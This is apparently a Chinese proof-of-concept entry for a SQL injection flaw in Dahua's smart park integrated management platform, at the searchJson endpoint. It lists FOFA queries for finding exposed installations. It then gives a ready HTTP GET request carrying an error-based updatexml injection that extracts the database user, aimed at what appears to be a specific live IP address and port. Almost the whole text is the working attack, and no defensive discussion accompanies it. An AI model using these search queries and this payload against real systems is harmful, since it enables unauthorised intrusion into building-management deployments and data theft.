# 大华智慧园区综合管理平台 searchJson SQL 注入漏洞

    ## fofa

```
body="src=\"/WPMS/asset/common/js/jsencrypt.min.js\""

product="dahua-智慧园区综合管理平台"
```

## poc

```
GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
Host: 111.53.23.133:8009
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip

```
